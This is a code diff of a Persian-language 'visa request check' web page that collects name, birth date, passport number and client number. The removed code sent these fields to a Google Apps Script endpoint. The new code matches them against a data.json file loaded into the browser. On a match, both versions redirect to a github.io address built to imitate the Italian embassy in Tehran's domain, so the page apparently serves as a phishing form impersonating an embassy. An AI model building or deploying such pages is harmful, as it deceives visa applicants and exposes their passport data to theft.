@@ -2,108 +2,68 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>فرم بررسی ویزا</title>
+  <title>بررسی اطلاعات و هدایت</title>
   <style>
-    body {
-      font-family: "Tahoma", sans-serif;
-      background: linear-gradient(to right, #e0f7fa, #ffffff);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    .form-container {
-      background-color: #ffffff;
-      padding: 25px 30px;
-      border-radius: 15px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
-      width: 100%;
-      max-width: 400px;
-    }
-
-    .form-container h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      color: #00796b;
-    }
-
-    input[type="text"] {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
-    }
-
-    button {
-      width: 100%;
-      background-color: #00796b;
-      color: white;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 15px;
-    }
-
-    button:hover {
-      background-color: #004d40;
-    }
-
-    #status {
-      text-align: center;
-      margin-top: 15px;
-      font-size: 14px;
-      color: red;
-    }
+    body { font-family: sans-serif; background: #f3f3f3; padding: 30px; }
+    form { background: #fff; padding: 20px; border-radius: 8px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 4px; border: 1px solid #ccc; }
+    button { padding: 10px; width: 100%; background: #007bff; color: white; border: none; border-radius: 5px; }
+    #status { text-align: center; margin-top: 15px; color: red; }
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <h2>بررسی درخواست ویزا</h2>
-    <form id="myForm">
-      <input type="text" name="Name" placeholder="نام" required>
-      <input type="text" name="LastName" placeholder="نام خانوادگی" required>
-      <input type="text" name="DOB" placeholder="تاریخ تولد (MM/DD/YYYY)" required>
-      <input type="text" name="PassportNo" placeholder="شماره پاسپورت" required>
-      <input type="text" name="ClientNo" placeholder="کد مشتری" required>
-      <button type="submit">بررسی</button>
-    </form>
-    <p id="status"></p>
-  </div>
+
+  <form id="myForm">
+    <input type="text" name="Name" placeholder="Name" required>
+    <input type="text" name="LastName" placeholder="Last Name" required>
+    <input type="text" name="DOB" placeholder="Date of Birth (MM/DD/YYYY)" required>
+    <input type="text" name="PassportNo" placeholder="Passport No" required>
+    <input type="text" name="ClientNo" placeholder="Client No" required>
+    <button type="submit">بررسی</button>
+    <div id="status"></div>
+  </form>
 
   <script>
+    let db = [];
+
+    // بارگذاری داده‌ها از فایل JSON
+    fetch('data.json')
+      .then(res => res.json())
+      .then(data => db = data);
+
     document.getElementById('myForm').addEventListener('submit', function(e) {
       e.preventDefault();
-      const form = e.target;
-      const formData = new FormData(form);
-      const params = new URLSearchParams();
+      const formData = new FormData(e.target);
+      const input = {
+        Name: formData.get("Name").trim(),
+        LastName: formData.get("LastName").trim(),
+        DOB: formData.get("DOB").trim(),
+        PassportNo: formData.get("PassportNo").trim(),
+        ClientNo: formData.get("ClientNo").trim()
+      };
 
-      for (const pair of formData.entries()) {
-        params.append(pair[0], pair[1]);
+      const match = db.find(entry =>
+        entry.Name === input.Name &&
+        entry.LastName === input.LastName &&
+        entry.DOB === input.DOB &&
+        entry.PassportNo === input.PassportNo &&
+        entry.ClientNo === input.ClientNo
+      );
+
+      const status = document.getElementById("status");
+
+      if (match) {
+        status.style.color = "green";
+        status.textContent = "تأیید شد، در حال هدایت...";
+        setTimeout(() => {
+          window.location.href = "https://ambteheran.github.io/https-ambteheran.esteri.it-it-/";
+        }, 3000);
+      } else {
+        status.style.color = "red";
+        status.textContent = "اطلاعات مطابقت ندارد!";
       }
-
-      fetch("https://script.google.com/macros/s/AKfycbz5O7pyNvoKDPSmi4WFL28PsqnJa39lLTad5SXS9o15iDiO6mFcYA2X90mnOxzmsUcj/exec?" + params.toString())
-        .then(res => res.json())
-        .then(data => {
-          if (data.success) {
-            document.getElementById("status").innerText = "تأیید شد، در حال انتقال...";
-            setTimeout(() => {
-              window.location.href = "https://ambteheran.github.io/https-ambteheran.esteri.it-it-/";
-            }, 3000);
-          } else {
-            document.getElementById("status").innerText = "اطلاعات مطابقت ندارد.";
-          }
-        })
-        .catch(err => {
-          document.getElementById("status").innerText = "خطا در ارتباط با سرور.";
-        });
     });
   </script>
+
 </body>
 </html>
